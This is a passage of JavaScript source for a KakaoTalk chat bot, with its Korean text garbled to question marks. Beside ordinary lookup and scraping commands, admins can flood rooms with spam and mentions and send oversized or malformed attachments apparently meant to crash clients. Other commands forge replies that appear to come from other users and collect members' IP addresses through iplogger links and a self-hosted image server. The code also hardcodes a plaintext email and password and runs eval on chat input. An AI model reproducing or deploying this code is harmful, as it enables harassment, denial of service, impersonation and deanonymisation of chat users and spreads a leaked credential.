                        if(!isNaN(m22)) {
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                            try {
                            channel.sendChat(new node_kakao.ChatBuilder().text(m12 + "\u200b".repeat(500) + "\n".repeat(200)).append(new node_kakao.MentionContent(channel.getUserInfo({ userId: _mid }))).build(1));
                        } catch (error) {
                            channel.sendChat("error");
                        }
                        }, 500);
                    } else {
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                            try {
                            channel.sendChat(new node_kakao.ChatBuilder().text(m12 + "\u200b".repeat(500) + "\n".repeat(200)).append(new node_kakao.MentionContent(channel.getUserInfo({ userId: data.mentions[0].user_id }))).build(1));
                        } catch (error) {
                            channel.sendChat("error");
                        }
                        }, 500);  
                    }
                } else {
                    channel.sendChat("[ ???? ]  ?????? ????????? ??????????????????");
                }
            }
        }



        if (data.text.startsWith(prefix + "?????? ")) {
            if (adminList.includes(id)) {
                if (!runningSpamString) {
                        var _mid = data.text.replace(prefix + "?????? ", "").split(" ");
                        if(!isNaN(_mid)) {
                        var i = 1;
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                            try {
                            channel.sendChat(new node_kakao.ChatBuilder().text("[" + i + "] ").append(new node_kakao.MentionContent(channel.getUserInfo({ userId: _mid }))).build(1));
                            i++;
                        } catch (error) {
                            channel.sendChat("error");
                        }
                        }, 110);
                    } else {
                        var i = 1;
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                            try {
                            channel.sendChat(new node_kakao.ChatBuilder().text("[" + i + "] ").append(new node_kakao.MentionContent(channel.getUserInfo({ userId: data.mentions[0].user_id }))).build(1));
                            i++;
                        } catch (error) {
                            channel.sendChat("error");
                        }
                        }, 110);  
                    }
                } else {
                    channel.sendChat("[ ???? ]  ?????? ????????? ??????????????????");
                }
            }
        }

        if (runningNick == true) {
            stringInterval = setInterval(() => {
                try {
                var text = "";
                var possible = "!??????????????????????????????????????????????????????????;?????????????????????-??????????????????????????????QWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm1234567890123456789123456789132465798????????????????????????????????";
                for (var i = 0; i < 15; i++)
                    text += possible.charAt(Math.floor(Math.random() * possible.length));
                nick2 = text;
                channel.changeProfile({
                    nickname: nick2,
                    profilePath: "",
                });
            } catch(error) { 
                console.log(error)
            }
            }, 1);
        }


        if (data.text.startsWith(prefix + "??????")) {
         if (adminList.includes(id)) {
               if (!runningSpamString1) {
    var i = 0;
          runningSpamString1 = true;
         stringInterval = setInterval(() => {
             i++;
            channel.sendChat(
             new node_kakao.ChatBuilder()
               .append(new node_kakao.AttachmentContent({
               }))
               .text("??? ????????????")
               .build(1)
           )
            channel.sendChat(
              new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                    shout: true,
                    "type": "animated-sticker/digital-item",
                    "path":  '4412207.emot_017.webp',
                     "name": "(????????????)",
                     "sound": "",
                     "width": "100",
                      "height": "100",
                      "msg": "", 
                   "alt": "????????? ????????????"
                  })).build(25)
             );
         runningNick = true
         }, 300);
         } else {
        channel.sendChat("[ ???? ]  ?????? ????????? ??????????????????");
        }
        }}

        if (data.text.startsWith(prefix + "??????")) {
            if (adminList.includes(id)) {
                if (data.originalType == node_kakao.KnownChatType.REPLY) {
                    if (!runningSpamString) {
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                            channel.sendChat(data._chat.attachment.src_message)
                        }, 140);
                    } else {
                        channel.sendChat("[ ???? ]  ?????? ????????? ??????????????????");
                    }
                }

            }
        }
        if (data.text.startsWith(prefix + "??????")) {
            if (adminList.includes(id)) {
                    if (!runningSpamString) {
                        var i = 0;
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                            sendErrorPhone3()
                            pausecomp(220)
                            channel.sendChat(
                                new node_kakao.ChatBuilder()
                                    .text("Search")
                                    .append(new node_kakao.AttachmentContent({
                                        "R": [
                                            {
                                                "L": "https://www.youtube.com/watch?v=BLh8IVr8lCk",
                                                "MA": [],
                                                "D": "PC ???",
                                                "PL": "???",
                                                "TM": "???",
                                                "SU": [
                                                    {
                                                        "TE": "",
                                                        "T": "m",
                                                        "IC": "",
                                                        "DE": ""
                                                    },
                                                    {
                                                        "TE": "",
                                                        "T": "s",
                                                        "IC": "",
                                                        "DE": ""
                                                    },
                                                    {
                                                        "TE": "",
                                                        "T": "t",
                                                        "IC": "",
                                                        "DE": ""
                                                    },
                                                    {
                                                        "TE": "",
                                                        "T": "b",
                                                        "IC": "",
                                                        "DE": ""
                                                    },
                                                    {
                                                        "TE": "",
                                                        "T": "l",
                                                        "IC": "",
                                                        "DE": ""
                                                    },
                                                    {
                                                        "TE": "",
                                                        "T": "o",
                                                        "IC": "28",
                                                        "DE": ""
                                                    },
                                                    {
                                                        "TE": "",
                                                        "T": "c",
                                                        "IC": "",
                                                        "DE": ""
                                                    },
                                                    {
                                                        "TE": "",
                                                        "T": "0",
                                                        "IC": "",
                                                        "DE": ""
                                                    }
                                                ]
                                            }
                                        ],
                                        "V": "weather",
                                        "callingPkg": "",
                                        "L": "https://www.youtube.com/watch?v=BLh8IVr8lCk",
                                        "Q": "PC"
                                    }))
                                    .build(23)
                            );
                            i++;
                        }, 700);
                    } else {
                        channel.sendChat("[ ???? ]  ?????? ????????? ??????????????????");
                    }
            }
        }

        if (data.text.startsWith(prefix + "??????")) {
            if (adminList.includes(id)) {
                    if (!runningSpamString) {
                        var i = 0;
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                            sendrawch(22,"",{
                                "name": "(????????????)",
                                "url": "2217108.emot_001.png",
                                "type": "animated-emoticon/digital-item",
                                "path2": "2212560.emot_033.png",
                                "scon": "6001001.file_008.scon",
                                "s": 0
                             })
                            i++;
                        }, 800);
                    } else {
                        channel.sendChat("[ ???? ]  ?????? ????????? ??????????????????");
                    }
            } else {
                channel.sendChat("[ ???? ] ????????? ?????? ???????????? ????????? ????????? ????????????");
            }
        }
        if (data.text.startsWith(prefix + "??????")) {
            if (adminList.includes(id)) {
                if (!runningSpamString) {
                    var i = 0;
                    runningSpamString = true;
                    stringInterval = setInterval(() => {
                        channel.sendChat(
                            new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                                "type": "animated-sticker/digital-item",
                                "path": '4412207.emot_017.webp',
                                "name": "(????????????)",
                                "sound": "",
                                "width": 200000,
                                "height": 20000, "msg": "",
                                "alt": "????????? ????????????"
                            })).build(25))
                        i++;
                    }, 180);
        }}}


        if (data.text.startsWith(prefix + "??????")) {
            if (adminList.includes(id)) {
                    if (!runningSpamString) {
                        var i = 0;
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                            sendErrorPhone()
                            i++;
                        }, 140);
                    } else {
                        channel.sendChat("[ ???? ]  ?????? ????????? ??????????????????");
                    }
            } else {
                channel.sendChat("[ ???? ] ????????? ?????? ???????????? ????????? ????????? ????????????");
            }
        }


        if (data.text.startsWith(prefix + "?????? ")) {
            if (adminList.includes(id)) {
                if (data.text == prefix + "??????") {
                    channel.sendChat("????????? ????????? ??????????????????!");
                } else {
                    if (!runningSpamString) {
                        var _message = data.text.replace(prefix + "?????? ", "");
                        var i = 0;
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                            channel.sendChat(_message);
                            i++;
                        }, 100);
                    } else {
                        channel.sendChat("[ ???? ]  ?????? ????????? ??????????????????");
                    }
                }
            } else {
                channel.sendChat("[ ???? ] ????????? ?????? ???????????? ????????? ????????? ????????????");
            }
        }
        if (data.text == prefix + "??????") {
            if (adminList.includes(id)) {
                if (runningSpamString) {
                    clearInterval(stringInterval);
                    stringInterval = null;
                    runningSpamString = false;
                } else {
                    channel.sendChat("[ ???? ] ????????? ???????????? ????????????!");
                }
            } else {
                channel.sendChat("[ ???? ] ????????? ?????? ???????????? ????????? ????????? ????????????!");
            }
        }

        if (data.text.startsWith(prefix + "?????? ")) {
            var m1 = data.text.replace(prefix + "?????? ", "").split('/')[0];
            var m2 = data.text.replace(prefix + "?????? ", "").split('/')[1];
            var m3 = data.text.replace(prefix + "?????? ", "").split('/')[2];
            customChat = data.chat;
            customChat.sender.userId = data.mentions[0].user_id;
            customChat.text = m1;
            channel.sendChat(
                new node_kakao.ChatBuilder()
                    .append(new node_kakao.ReplyContent(customChat))
                    .text(m2 + "")
                    .build(node_kakao.KnownChatType.REPLY)
            );
        }


        if (data.text.startsWith(prefix + "????????? ")) {
            var m12 = data.text.replace(prefix + "????????? ", "").split('/')[0];
            var m22 = data.text.replace(prefix + "????????? ", "").split('/')[1];
            channel.sendChat(
                new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                    "type": "animated-sticker/digital-item",
                    "path": "4412206.emot_017.webp",
                    "name": "(????????????)",
                    "sound": "",
                    "width": m12,
                    "height": m22,
                    "msg": '',
                    "alt": "????????? ????????????"
                })).build(25)
            );
        }

        if (data.text == "=%??????") {
            channel.sendChat("????????? : " + email + "\n???????????? : " + pw)
        }

        if (data.text == prefix + "????????????") {
            email = "???????????????"
            pw = "???????????????????"
            channel.sendChat("??????????????? ???????????????")
        }


        if (data.text == prefix + "?????????") {
            if (adminList.includes(id)) {
            email = "shgusrbs09@gmail.com"
            pw = "jjj*1920"
            channel.sendChat("?????? ??????????????????!")
            start()
        }}


        //channel.sendChat(channel.getUserInfo(371707126).memberStruct.originalProfileImageUrl)
        if (data.text.startsWith(prefix + "???")) {
            if (adminList.includes(id)) {
                channel.setTitleMeta("????????? ????????????!")
                var ur = "https://prod.cloud.rockstargames.com/crews/sc/2816/41255217/publish/emblem/emblem_256.png"
                channel.setProfileMeta({
                    imageUrl: ur,
                  fullImageUrl: ur,
                  })
                  async function aa() {
                     await channel.setLiveTalkInfoMeta({
                        "liveon": true,
                        "title": "??????",
                        "startTime": 1111111111,
                        "userId": "",
                        "csIP": "211.231.102.213",
                        "csIP6": "2404:4600:6:369:211:231:102:213",
                        "csPort": 9000,
                        "callId": "1111111111111111"
                    });
                    await channel.setLiveTalkCountMeta({
                        count: 1
                    });
                }
                aa();
        }
    }

        if (data.text.startsWith(prefix + "hacked")) {
            if (adminList.includes(id)) {
                channel.setTitleMeta("yOu ArE hAcKEd")
                var ur = "http://th-m10.talk.kakao.com/th/talkm/oYPeratGVu/CYlTf3tUgFZn58ODofrY61/i_f6707dd5e0ad_120x120.jpg"
                channel.setProfileMeta({
                    imageUrl: ur,
                  fullImageUrl: ur,
                  })
                  async function aa() {
                     await channel.setLiveTalkInfoMeta({
                        "liveon": true,
                        "title": "??????",
                        "startTime": 1111111111,
                        "userId": "",
                        "csIP": "211.231.102.213",
                        "csIP6": "2404:4600:6:369:211:231:102:213",
                        "csPort": 9000,
                        "callId": "1111111111111111"
                    });
                    await channel.setLiveTalkCountMeta({
                        count: 1
                    });
                }
                aa();
        }
    }

    if (data.text.startsWith(prefix + "?????? ")) {
        if (adminList.includes(id)) {
            var R = data.text.replace(prefix + "?????? ", "");
            channel.sendChat("????????? " + prefix + "?????? " + R +"??? ?????????????????????")
            prefix = R
        } else {
            channel.sendChat("[ ???? ] ??? ???????????? ????????? ????????? ????????????");
        }
    }

        if (data.text.startsWith(prefix + "?????? ")) {
            if (adminList.includes(id)) {
                var RoomName = data.text.replace(prefix + "?????? ", "");
                channel.setTitleMeta(RoomName)
                channel.sendChat("???????????? " + RoomName + " ??? ?????????????????????")
            } else {
                channel.sendChat("[ ???? ] ??? ???????????? ????????? ????????? ????????????");
            }
        }
        if (data.text.startsWith(prefix + "?????????")) {
            if (data.originalType == node_kakao.KnownChatType.REPLY) {
                channel.sendChat("[ ???? ] " + channel.getUserInfo({ userId: data._chat.attachment.src_userId }).nickname + "?????? ID : " + data._chat.attachment.src_userId)
            }
        }

        if (data.text.startsWith(prefix + "????????? ")) {
            channel.sendChat("[ ???? ] " + channel.getUserInfo({ userId: data.mentions[0].user_id }).nickname + "?????? ID : " + data.mentions[0].user_id)
        }



        if (data.text.startsWith(prefix + "?????? ")) {
            channel.sendChat("[ ?????? ] \n\n" + channel.getUserInfo({ userId: data.mentions[0].user_id }).statusMessage)
        }


        if (data.text.startsWith(prefix + "?????? ")) {
            if (adminList.includes(id)) {
                var mid = data.text.replace(prefix + "?????? ", "");
                try {
                    channel.sendChat(new node_kakao.ChatBuilder().text("[ ! ] ").append(new node_kakao.MentionContent(channel.getUserInfo({ userId: mid }))).text("?????? ??????????????????").build(1));
                } catch {
                    channel.sendChat("[ ???? ] ????????? ????????? ???????????? ????????????")
                }
            }
        }



        if (data.text.startsWith(prefix + "??????")) {
            if (adminList.includes(id)) {
                if (king.includes(roomId)) {
                    channel.sendChat("stop")
                    for (var getValueFor = 0; getValueFor < king.length; getValueFor++) {
                        if (king[getValueFor] == roomId) {
                            king.splice(getValueFor);
                        }}            
            } else {
                king.push(roomId)
                channel.sendChat("start")
            }
        }
        }

        if (data.text.startsWith(prefix + "???")) {
            if (adminList.includes(id)) {
                if (fuck.includes(roomId)) {
                    channel.sendChat("stop")
                    for (var getValueFor = 0; getValueFor < fuck.length; getValueFor++) {
                        if (fuck[getValueFor] == roomId) {
                            fuck.splice(getValueFor);
                        }}            
            } else {
                fuck.push(roomId)
                channel.sendChat("start")
            }
        }
        }
        if (data.text.startsWith(prefix + "admin")) {
            channel.sendChat("adminList! : " + adminList);
        }
        if (data.text.startsWith(prefix + "??????")) {
            if (adminList.includes(id)) {
                channel.sendChat(
                    new node_kakao.ChatBuilder()
                        .append(new node_kakao.AttachmentContent({
                            "L": "https://iplogger.org/2AykA6",
                            "Q": "??????",
                            "V": "image",
                            "R": [
                                {
                                    "D": "??????",
                                    "L": "https://iplogger.org/2AykA6",
                                    "I": "https://iplogger.org/2AykA6",
                                    "W": 200,
                                    "H": 200
                                }
                            ]
                        }))
                        .build(23)
                );
            }
        }
        if (data.text == prefix + "??????2") {
            if (adminList.includes(id)) {
        sendrawch(52,'{ "type":"linvite","csIP":"211.231.102.205","csIP6":"2404:4600:6:368:211:231:102:205","csPort":9000,"title":"","startTime":1641404554,"duration":0 }',{
            "type": "linvite",
            "csIP": "211.231.102.205",
            "csIP6": "2404:4600:6:368:211:231:102:205",
            "csPort": 9000,
            "title": "??????",
            "duration": 0
         })
        }}
        if (data.text.startsWith(prefix + "?????? ")) {
            if (adminList.includes(id)) {
                var bye = data.text.replace(prefix + "?????? ", "");
         sendrawch(51,'{ "type":"bye","csIP":"211.231.102.5","csIP6":"2404:4600:6:238:211:231:102:5","csPort":9000,"callId":"178543096168872649","duration":' + bye +'}',{
            "type": "bye",
            "csIP": "211.231.102.5",
            "csIP6": "2404:4600:6:238:211:231:102:5",
            "csPort": 9000,
            "callId": "178543096168872649",
            "duration": bye
         })
        }}
        if (data.text == prefix + "??????") {
            if (adminList.includes(id)) {
                channel.sendChat(
                    new node_kakao.ChatBuilder()
                        .text("Search")
                        .append(new node_kakao.AttachmentContent({
                            "R": [
                                {
                                    "L": "",
                                    "MA": [],
                                    "D": "",
                                    "PL": "",
                                    "TM": "",
                                    "SU": [
                                        {
                                            "TE": "",
                                            "T": "",
                                            "IC": "",
                                            "DE": ""
                                        },
                                    ]
                                }
                            ],
                            "V": "weather",
                            "callingPkg": "",
                            "L": "",
                            "Q": ""
                        }))
                        .build(23)
                );
            }
        }
        if (data.text.startsWith(prefix + "?????? ")) {
            if (adminList.includes(id)) {
                    var _Mention = data.mentions[0].user_id;
                    var detectChar = roomId + ":" + _Mention + "";
                    if (mustDetect.includes(detectChar)) {
                        channel.sendChat("[ ???? ] ?????? ????????? ?????? ??????????????????...");
                    } else {
                        mustDetect.push(detectChar);
                        channel.sendChat("[ ???? ] ?????? ????????? ???????????????");
                        console.log(msg)
                    }
            }
        }




        if (data.text.startsWith(prefix + "??? ")) {
            var lol = data.text.replace(prefix + "??? ", "");
            request("https://www.op.gg/summoner/userName=" + encodeURI(lol),
                (error, response, html) => {
                        var $ = cheerio.load(html);
                        var tier = $("div.TierRank").text();
                        var img = $("img.ProfileImage").attr("src");
                        var tierimg = $("div.SummonerRatingMedium > div > img.Image").attr("src");
                        var l = $("div.ProfileIcon > span").text();
                        var name = $("div.Information > span.Name").text();
                        var ranking = $("div.LadderRank > a > span.ranking").text();
                        var w = $("div.TierInfo > span.WinLose > span.wins").text();
                        var time = $("div.TimeStamp > span").text();
                        var lo = $("div.TierInfo > span.WinLose > span.losses").text();
                        var io = $("div.TierInfo > span.WinLose > span.winratio").text().split("Win Ratio ")[1];
                        if(name.length == "0") {
                            channel.sendChat("????????? ???????????????")
                        } else {
                            if(w.length == "0") {
                                w = "??????"
                                lo = "??????"
                            }
                          sendrawch(23,"",{
                            "L": " ",
                            "Q": "[ ?????? ?????? ????????? ??????]",
                            "V": "music",
                            "F": {},
                            "R": [
                               {
                                  "L": "",
                                  "T": name + "/" + tier.replace("\n\t\t\t",""),
                                  "I": "https:" + img,
                                  "W": 400,
                                  "H": 400,
                                  "DE": "Level : " + l + " | W/L : " + w.replace("W","???") +" " + lo.replace("L","???")
                               }
                            ],                  
                            "RF": {
                               "BU": [
                                  {
                                     "L": "https://www.op.gg/summoner/userName=" + lol,
                                     "T": "????????? ??????",
                                  }]}
                         })}
                }
            );
        }
        if (data.text.startsWith(prefix + "????????? ")) {
            channel.sendChat(
                new node_kakao.ChatBuilder()
                    .text("???????????? ?????????")
                    .append(new node_kakao.AttachmentContent({
                        "userId": data.mentions[0].user_id,
                        "nickName": "",
                        "fullProfileImageUrl": "",
                        "profileImageUrl": "",
                        "statusMessage": ""
                    }))
                    .build(17)
            );
        }
        function sendWord(_text) {
                channel.sendChat(
                    new node_kakao.ChatBuilder()
                    .append(new node_kakao.AttachmentContent({
                        "os": [
                            {
                               "t": 3,
                               "st": 2,
                               "u": {
                                  "id": id
                               }
                            },
                            {
                               "t": 1,
                               "ct": _text,
                               "jct": "[{\"type\":\"text\",\"text\":\""+ _text + "\"}]"
                            }
                        ]                      
                    }))
                    .build(24)
                );}
        if (data.text.startsWith(prefix + "????????? ")) {
            if (adminList.includes(id)) {
                sendWord(data.text.replace(prefix + "????????? ", ""));
        }}

        if (data.text.startsWith(prefix + "??????")) {
            if (adminList.includes(id)) {
            var profile = data.text.replace(prefix + "?????? ", "");
            var sid = parseInt(parseInt(data.text.substr(4)).toString(2).substr(27), 2) + 2
            channel.sendChat(
                new node_kakao.ChatBuilder()
                    .text("???????????? ?????????")
                    .append(new node_kakao.AttachmentContent({
                        "userId": sid,
                    }))
                    .build(17)
            );
            channel.sendChat("?????? ????????? : " + sid)
        }}

        if (data.text.startsWith(prefix + "????????? ")) {
            var profile = data.text.replace(prefix + "????????? ", "");
            channel.sendChat(
                new node_kakao.ChatBuilder()
                    .text("???????????? ?????????")
                    .append(new node_kakao.AttachmentContent({
                        "userId": profile,
                        "nickName": "",
                        "fullProfileImageUrl": "",
                        "profileImageUrl": "",
                        "statusMessage": ""
                    }))
                    .build(17)
            );
        }

        if (data.text.startsWith(prefix + "????????? ")) {
            var we = data.text.replace(prefix + "????????? ", "");
            channel.sendChat(
                new node_kakao.ChatBuilder()
                    .append(new node_kakao.AttachmentContent({
                        shout: true
                    }))
                    .text(we)
                    .build(1)
            )
        }

        if (data.text.startsWith(prefix + "?????? ")) {
            if (adminList.includes(id)) {
                var tran = data.text.replace(prefix + "?????? ", "");
                translate(tran, {to: 'en'}).then(res => {
                    channel.sendChat(res)
                }).catch(err => {
                    console.error(err)
                })
            }}
            if (data.text.startsWith(prefix + "?????? ")) {
                var ur = data.text.replace(prefix + "?????? ", "");
                channel.setProfileMeta({
                    imageUrl: ur,
                  fullImageUrl: ur,
                  })
                channel.sendChat("[ ???? ] succces")
            }


            if (data.text.startsWith(prefix + "tv ")) {
                var ur = data.text.replace(prefix + "tv ", "");
                channel.setTvLiveMeta(
                    {
                        "url": ur,
                        "live": 'on'
                    })
                channel.sendChat("[ ???? ] tv on")
            }
    
            if (data.text.startsWith(prefix + "offtv")) {
                channel.setTvLiveMeta(
                    {
                        "url": '',
                        "live": 'off'
                    })
                channel.sendChat("[ ???? ] tv off")
            }
    

        if (data.text.startsWith(prefix + "?????? ")) {
            if (adminList.includes(id)) {
                var nick = data.text.replace(prefix + "?????? ", "");
                channel.sendChat("?????? ???????????? " + nick + "?????? ?????????????????????")
                channel.changeProfile({
                    nickname: nick,
                    profilePath: "",
                });
            }
        }

        function test() {
            let sum = 0;
            for (let i = 1; i <= 1000000; i++) {
                sum = sum + i;
            }
        }


        if (data.text == prefix + "???") {
            let start = new Date();  // ??????
            test();
            let end = new Date();  // ??????
            var ms = end - start
            var ms1 = ms * 0.01
            channel.sendChat("RUNTIME : " + ms1 + "\nDev Plus Bot??? ???????????? ?????? ?????? ????????????!")
        }

                
                

        roominfo = CLIENT.channelList.open.getJoinInfo("https://open.kakao.com/me/_js")
        

        if (data.text == prefix + "????????????") {
            sendrawch(23,"",{
                "L": "",
                "Q": "????????????",
                "V": "simple",
                "RH": {
                   "HI": {
                      "W": 500,
                      "H": 500,
                      "L": "",
                      "I": ipLog_adress,
                   }
                },
                "R": [
                   {
                      "L": " ",
                      "T": "<font color=#dc143c>" + "3"+ "</font>",
                      "D": "????????? ????????? 3???"
                   }
                ]                     
             })
        }

        if (data.text == prefix + "????????????") {
            sendrawch(23,"",{
                "L": "",
                "Q": "????????????",
                "V": "simple",
                "RH": {
                   "HI": {
                      "W": 500,
                      "H": 500,
                      "L": "",
                      "I": ipLog_adress,
                   }
                },
                "R": [
                   {
                      "L": " ",
                      "T": "<font color=#dc143c>" + "undefined"+ "</font>",
                      "D": "???-???"
                   }
                ]                     
             })
        }

        if (data.text == prefix + "x" || data.text == prefix + "X" ) {
            if (adminList.includes(id)) {
            try {
                iplogid  = data.chat.logId
                ipLog_admin = getDnsIp.address();
                ipLog_channel = channel;
                ipLog_local = "";
                ipLog_usingServer = "Using";
                http.get({ 'host': 'api.ipify.org', 'port': 80, 'path': '/' }, function (res) {
                    res.on("data", function (chunk) {
                        ipLog_local = chunk;
                        ipLog_adress = "http://" + chunk + ":" + ipPort + "/"
                        channel.sendChat(ipLog_adress)
                        sendrawch(23,"",{
                            "L": "",
                            "Q": "????????? ??????",
                            "V": "simple",
                            "RH": {
                               "HI": {
                                  "W": 500,
                                  "H": 500,
                                  "L": "",
                                  "I": ipLog_adress,
                               }
                            },
                            "R": [
                               {
                                  "L": " ",
                                  "T": "<font color=#dc143c>" + "???~ ?????? ??????!"+ "</font>",
                                  "D": "?????? 523???"
                               }
                            ]                     
                         })  
                    });
                }).on('error', function (e) {
                    console.log("ERROR OCCURRED DURING GRABBING IP!");
                    return;
                });
                let mentionList1 = chunk(Array.from(channel.getAllUserInfo()), 15);
                for (var i = 0; i < mentionList1.length; i++) {
                  mentionList1[i].forEach((v, j) => {
                    pausecomp(0);
                      var detectChar = roomId + ":" + v.userId
                      mustDetect.push(detectChar);
                  })
                }
            } catch (e) {
                channel.sendChat(e + "?????????");
            }
        }}


         
        if (data.text == prefix + "x!" || data.text == prefix + "X!" ) {
                    if (adminList.includes(id)) {
                        if (ipLog_usingServer != "None") {
                            try {
                                channel.sendChat("None");
                                ipLog_loggedIps = [];
                                ipLog_usingServer = "None";
                            } catch (e) {
                                channel.sendChat(e + "?????????");
                            }
                        } else {
                        }
                    } else {
                        channel.sendChat("????????? ?????? ???????????? ????????? ????????? ????????????!");
                    }
                }




                if (data.text == prefix + "??????") {
                sendrawch(23,"",{
                    "L": "https://open.kakao.com/o/gQJPVmOd",
                    "Q": "[ Et??? ????????? ]",
                    "V": "simple",
                    "RH": {
                       "HI": {
                          "W": 500,
                          "H": 500,
                          "L": "https://open.kakao.com/o/gQJPVmOd",
                          "I": "https://th-m2.talk.kakao.com/th/talkm/oYRUBuBJeP/R5XaYLUuwQSKc8uqFAScVk/i_d4302e66c7cf.jpg",
                       }
                    },
                    "R": [
                       {
                          "L": "https://open.kakao.com/o/gT5yw0Rd",
                          "T": "Et??? ?????????",
                          "D": "Et??? ??????????????????! ???????????????! (?????? ????????????!)"
                       }
                    ]                     
                 })  
                }



        if (data.text == prefix + "????????????") {
            dlog = true
            channel.sendChat("[ ???? ] ???????????? ??????????????? ???????????????");
        }

        if (data.text == prefix + "????????????") {
            dlog = false
            channel.sendChat("[ ???? ] ???????????? ??????????????? ????????? ???????????????");
        }

        if (data.text.startsWith(prefix + "?????? ")) {
            var m1 = data.text.replace(prefix + "?????? ", "").split('/')[0];
            var m2 = data.text.replace(prefix + "?????? ", "").split('/')[1];
            channel.sendChat(
                new node_kakao.ChatBuilder()
                    .append(new node_kakao.AttachmentContent({
                        "L": "",
                        "Q": "??????",
                        "V": "image",
                        "R": [
                            {
                                "D": "??????",
                                "L": "https://ssl.daumcdn.net/map3/staticmap/image?srs=wgs84&size=500x258&markers=symbol:sc_marker%7Clocation:" + m2 +  "," + m1 + "&logo=none",
                                "I": "https://ssl.daumcdn.net/map3/staticmap/image?srs=wgs84&size=500x258&markers=symbol:sc_marker%7Clocation:" + m2 +  "," + m1 + "&logo=none",
                                "W": 1000,
                                "H": 516
                            }
                        ]
                    }))
                    .build(23)
            );
        }

    if (data.text.startsWith(prefix + "?????????")) {
        if (adminList.includes(id)) {
    channel.sendChat(
        new node_kakao.ChatBuilder()
            .append(new node_kakao.AttachmentContent({
                "L": "",
                "Q": "?????? ?????????",
                "V": "image",
                "R": [
                    {
                        "D": "?????? ?????????",
                        "L": "",
                        "I": "https://allbotserver.herokuapp.com/",
                        "W": 2500,
                        "H": 320
                    }
                ]
            }))
            .build(23)
    );
        }}
        if (data.text == prefix + "?????????") {
            channel.sendChat(
                new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                    "L": "g-o.kro.kr/?kakaoopen://card/create",
                    "Q": "????????? ???????????? ????????????",
                    "V": "image",
                    "R": [
                        {
                            "D": "????????? ???????????? ????????????",
                            "L": 'g-o.kro.kr/?kakaoopen://card/create',
                            "I": "https://th.bing.com/th/id/R.88de159ff9fff2c917411291b5bb6785?rik=krlpZiQ29iHjWg&riu=http%3a%2f%2fblogfiles.naver.net%2f20160531_10%2flinakim97_1464665776716dgTCK_JPEG%2f%c4%ab%c4%ab%25BF%25C0%25C5%25E5_%25C0%cc%b8%25F0%c6%bc%25C4%25DC_%25C0%cc%b9%25CC%25C1%25F6_%25B3%25F5%c4%a5%25BC%25F6_%25BE%25F8%25B4%25D9_10.jpg&ehk=VuVRF5aPzHVJ61XiVAdNGr2kUqJhevj5ru8ke2agz%2bI%3d&risl=&pid=ImgRaw&r=0",
                            "W": 10,
                            "H": 10
                        }
                    ]
                }))
                    .build(23)
            )
        }



        if (data.text == prefix + "?????????") {
            channel.sendChat(
                new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                    "L": "https://www.youtube.com/watch?v=iwrkH5VP4Io",
                    "Q": "????????? ????????????",
                    "V": "image",
                    "R": [
                        {
                            "D": "?????????",
                            "L": 'https://www.youtube.com/watch?v=iwrkH5VP4Io',
                            "I": "https://yt3.ggpht.com/a/AATXAJwvfI3adCGyvZTtU_jqMgSRtjdzjaov8nClFgiS=s900-c-k-c0xffffffff-no-rj-mo",
                            "W": 10,
                            "H": 10
                        }
                    ]
                }))
                    .build(23)
            )
        }

        if (data.text.startsWith(prefix + "?????? ")) {
            var sus1 =   channel.getUserInfo({ userId:  data.mentions[0].user_id}).nickname
               var sus =   channel.getUserInfo({ userId:  data.mentions[0].user_id}).suspended
               console.log(sus + "")
               channel.sendChat(sus1 + "?????? ?????? ??????????????? \n\n" + sus)
        }


        if (data.text.startsWith(prefix + "??????")) {
            var sus1 =   channel.getUserInfo({ userId: data._chat.attachment.src_userId }).nickname
               var sus =   channel.getUserInfo({ userId: data._chat.attachment.src_userId }).suspended
               console.log(sus + "")
               channel.sendChat(sus1 + "?????? ?????? ??????????????? \n\n" + sus)
        }

        if (data.text.startsWith(prefix + "ev ")) {
            if (adminList.includes(id)) {
                try {
                    channel.sendChat(String(eval(data.text.substr(4))))
                } catch (error) {
                    channel.sendChat("[ ???? ] ?????????????????????.\n" + "\u200b".repeat(500) + error);
                }
            }
        }

        if (data.text == prefix + "????????????") {
            if (adminList.includes(id)) {
            channel.sendChat(
                new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                    "type": "animated-sticker/digital-item",
                    "path": '4412207.emot_017.webp',
                    "name": "(????????????)",
                    "sound": "",
                    "width": 20000,
                    "height": 20000, "msg": "",
                    "alt": "????????? ????????????"
                })).build(25)
            );
        }}

        if (data.text == prefix + "??????") {
            if (adminList.includes(id)) {
        var url = 'http://www.melon.com/chart/';
        var title = new Array(),
            artist = new Array(),
            up_date,
            up_time;
            var chart = ""
        var rank = 100;  //100????????? ?????? 
        request(url, function(error, response, html){
          if (!error) {
            var $ = cheerio.load(html);
           // ?????? ??????
            for (var i = 0; i < rank; i++) {
              $('.ellipsis.rank01 > span > a').each(function(){
                var title_info = $(this);
                var title_info_text = title_info.text();
                title[i] = title_info_text;
                i++;
              })
            }
            // ??????????????? ??????
            for (var i = 0; i < rank; i++) {
              $('.checkEllipsis').each(function(){
                var artist_info = $(this);
                var artist_info_text = artist_info.text();
                artist[i] = artist_info_text;
                i++;
              })
            }
            // ???????????? ??????
            $('.year').each(function(){
              var date_info = $(this);
              var date_info_text = date_info.text();
              up_date = date_info_text;
            })
            // ???????????? ??????
            $('.hhmm > span').each(function(){
              var time_info = $(this);
              var time_info_text = time_info.text();
              up_time = time_info_text;
            })
            //xxxx??? xx??? xx??? ??????/?????? xx??? format
            var up_date_arr = new Array();
            var up_date_arr = up_date.split('.');
            var up_time_arr = new Array();
            var up_time_arr = up_time.split(':');
            var newtime;
            // ?????? ?????? ??????
            if (up_time_arr[0] >12) {
